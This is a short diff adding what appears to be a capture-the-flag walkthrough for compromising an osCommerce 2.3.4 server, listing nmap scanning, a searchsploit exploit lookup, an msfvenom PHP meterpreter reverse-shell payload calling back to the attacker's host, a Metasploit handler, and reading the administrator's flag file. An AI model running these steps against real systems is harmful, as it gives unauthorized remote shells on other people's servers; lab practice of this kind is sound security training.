@@ -1,0 +1,10 @@
+1 - nmap -A 10.10.42.176
+2 - searchsploit 'oscommerce 2.3.4'
+3 - searchsploit -m 44374
+4 - msfvenom -p php/meterpreter/reverse_tcp LHOST=10.8.94.51 LPORT=4444 -e php/base64 raw 
+5 - msfconsole -> use exploit/multi/handler -> set payload php/meterpreter/reverse_tcp -> run
+6 - python3 44374.py
+7 - ctrl + z
+8 - sessions -u SESSION_NUMBEr
+9 - whoami
+10 - cat c:\users\administartor\desktop\root.txt.txt 
